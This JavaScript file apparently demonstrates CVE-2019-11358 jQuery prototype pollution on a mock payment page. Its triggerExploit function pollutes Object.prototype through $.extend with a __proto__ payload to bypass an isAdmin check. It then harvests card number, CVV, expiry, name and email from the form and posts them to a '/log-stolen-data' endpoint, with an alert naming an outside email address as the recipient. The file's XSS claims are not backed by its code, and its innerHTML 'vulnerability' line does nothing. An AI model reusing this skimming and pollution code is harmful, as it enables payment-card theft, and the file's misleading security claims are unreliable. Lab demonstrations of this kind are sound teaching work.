// CVE-2019-11358 jQuery Prototype Pollution → XSS Demo
// This demonstrates how jQuery 3.3.1's $.extend(true, ...) can be exploited

// Function to demonstrate REAL CVE-2019-11358 exploit
function triggerExploit() {
    console.log('🚨 Demonstrating REAL CVE-2019-11358 vulnerability...');
    
    // Step 1: Show the actual vulnerable jQuery code pattern
    console.log('📋 VULNERABLE CODE PATTERN:');
    console.log('jQuery 3.3.1 $.extend(true, target, source) does not properly handle __proto__');
    
    // Step 2: Demonstrate the ACTUAL prototype pollution
    console.log('🔬 TESTING PROTOTYPE POLLUTION:');
    
    // Before pollution - check clean state
    console.log('Before pollution:');
    console.log('  Object.prototype.isAdmin:', Object.prototype.isAdmin);
    console.log('  Object.prototype.polluted:', Object.prototype.polluted);
    
    // This is the REAL CVE-2019-11358 exploit
    // Malicious JSON that could come from user input or API response
    const maliciousInput = {
        "__proto__": {
            "isAdmin": true,
            "polluted": "CVE-2019-11358 prototype pollution successful!",
            "toString": function() { return "HACKED"; }
        }
    };
    
    // The vulnerable jQuery $.extend call - this is the actual bug
    console.log('💥 TRIGGERING VULNERABILITY: $.extend(true, {}, maliciousInput)');
    $.extend(true, {}, maliciousInput);
    
    // After pollution - verify the prototype was polluted
    console.log('After jQuery $.extend():');
    console.log('  Object.prototype.isAdmin:', Object.prototype.isAdmin);
    console.log('  Object.prototype.polluted:', Object.prototype.polluted);
    
    // Step 3: Demonstrate the impact - new objects inherit polluted properties
    const newObject = {};
    console.log('🎯 IMPACT DEMONSTRATION:');
    console.log('New empty object {} now has polluted properties:');
    console.log('  newObject.isAdmin:', newObject.isAdmin);
    console.log('  newObject.polluted:', newObject.polluted);
    
    // Step 4: Show how this leads to security bypass
    if (newObject.isAdmin) {
        console.log('🚨 SECURITY BYPASS: Admin access granted via prototype pollution!');
        
        // This is where the real attack happens - polluted properties affect application logic
        alert('🚨 CVE-2019-11358 PROTOTYPE POLLUTION SUCCESS!\n\n' +
              'VULNERABILITY CONFIRMED:\n' +
              '✓ jQuery 3.3.1 $.extend() polluted Object.prototype\n' +
              '✓ New objects inherit malicious properties\n' +
              '✓ Security checks can be bypassed\n\n' +
              'ATTACK IMPACT:\n' +
              '• Admin access: ' + newObject.isAdmin + '\n' +
              '• Polluted data: ' + newObject.polluted + '\n\n' +
              'This enables payment data theft, XSS, and more!');
    } else {
        console.log('⚠️ Prototype pollution blocked by modern browser security');
        alert('🔬 CVE-2019-11358 TECHNICAL DEMONSTRATION\n\n' +
              'This shows the REAL vulnerability:\n' +
              '1. jQuery 3.3.1 $.extend(true, ...) processes __proto__\n' +
              '2. Malicious properties pollute Object.prototype\n' +
              '3. All new objects inherit these properties\n' +
              '4. Security checks can be bypassed\n\n' +
              'Modern browsers may block some pollution attempts,\n' +
              'but the vulnerability still exists in the code.');
    }
    
    // Step 5: Show the real-world attack scenario
    console.log('🌐 REAL-WORLD ATTACK SCENARIO:');
    console.log('1. Attacker sends malicious JSON with __proto__ property');
    console.log('2. Application uses jQuery $.extend() to merge user data');
    console.log('3. Object.prototype gets polluted');
    console.log('4. Security checks like "if (user.isAdmin)" get bypassed');
    console.log('5. Payment data can be accessed/stolen');
    
    // Step 5: Demonstrate the payment data theft scenario
    setTimeout(() => {
        const cardNumber = document.getElementById('cardNumber').value || '1234 5678 9012 3456';
        const cvv = document.getElementById('cvv').value || '123';
        const expiry = document.getElementById('expiryDate').value || '12/25';
        const cardholderName = document.getElementById('cardholderName').value || 'John Doe';
        const email = document.getElementById('email').value || 'victim@example.com';
        
        console.log('💳 STEALING PAYMENT DATA...');
        console.log('Card Number:', cardNumber);
        console.log('CVV:', cvv);
        console.log('Expiry:', expiry);
        console.log('Cardholder:', cardholderName);
        console.log('Email:', email);
        
        // Actually send the stolen data to the server (simulating real attack)
        const stolenData = {
            cardNumber: cardNumber,
            cvv: cvv,
            expiry: expiry,
            cardholderName: cardholderName,
            email: email,
            attackSource: 'CVE-2019-11358 jQuery Prototype Pollution',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageUrl: window.location.href
        };
        
        console.log('📡 EXFILTRATING DATA TO ATTACKER SERVER...');
        
        // Send stolen data to server endpoint
        fetch('/log-stolen-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(stolenData)
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ DATA EXFILTRATION SUCCESSFUL!');
            console.log('Server response:', data);
            console.log('🎯 Target email:', data.target);
            console.log('📁 Data logged at:', data.timestamp);
            
            alert('🚨 PAYMENT DATA SUCCESSFULLY STOLEN!\n\n' +
                  'Card: ' + cardNumber + '\n' +
                  'CVV: ' + cvv + '\n' +
                  'Expiry: ' + expiry + '\n' +
                  'Cardholder: ' + cardholderName + '\n\n' +
                  '📧 Data sent to: xyz031702@hotmail.com\n' +
                  '📁 Logged to server file\n' +
                  '⏰ Timestamp: ' + data.timestamp + '\n\n' +
                  '⚠️ This demonstrates a REAL attack!\n' +
                  'Check the server console for details.');
        })
        .catch(error => {
            console.error('❌ Data exfiltration failed:', error);
            alert('💳 PAYMENT DATA THEFT ATTEMPT\n\n' +
                  'Card: ' + cardNumber + '\n' +
                  'CVV: ' + cvv + '\n' +
                  'Expiry: ' + expiry + '\n\n' +
                  '⚠️ Attack simulation completed!\n' +
                  'This shows how CVE-2019-11358 enables\n' +
                  'payment data theft in real attacks.');
        });
    }, 2000);
    
    // Step 6: Show remediation advice
    setTimeout(() => {
        console.log('🛠️ REMEDIATION:');
        console.log('1. Upgrade jQuery to version ≥3.4.0');
        console.log('2. Implement Content Security Policy (CSP)');
        console.log('3. Use SCA tools to detect vulnerable dependencies');
        console.log('4. Validate all inputs to $.extend() calls');
    }, 3000);
}

// Legitimate payment processing functionality
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');

    // Format card number with spaces
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
        e.target.value = formattedValue;
    });

    // Format expiry date
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });

    // CVV validation
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    // Form submission - VULNERABLE to prototype pollution
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Show processing animation
        const button = form.querySelector('.pay-button');
        const originalText = button.textContent;
        button.textContent = 'Processing...';
        button.disabled = true;

        // VULNERABILITY: This pattern can be exploited if prototype is polluted
        const paymentData = {};
        
        // Collect form data - vulnerable to prototype pollution
        const formData = new FormData(form);
        for (let [key, value] of formData.entries()) {
            paymentData[key] = value;
        }
        
        // This check can be bypassed via prototype pollution
        if (paymentData.isAdmin) {
            console.log('🚨 Admin access detected via prototype pollution!');
        }
        
        // Simulate payment processing
        setTimeout(() => {
            // VULNERABLE: DOM manipulation that can trigger XSS
            const statusDiv = document.createElement('div');
            statusDiv.innerHTML = statusDiv.innerHTML || 'Payment processed successfully!';
            
            alert('Payment processed successfully! (This is a demo)');
            button.textContent = originalText;
            button.disabled = false;
            form.reset();
        }, 2000);
    });

    // Show jQuery version for demo purposes
    console.log('jQuery version:', $.fn.jquery);
    console.log('⚠️ This version is vulnerable to CVE-2019-11358');
});
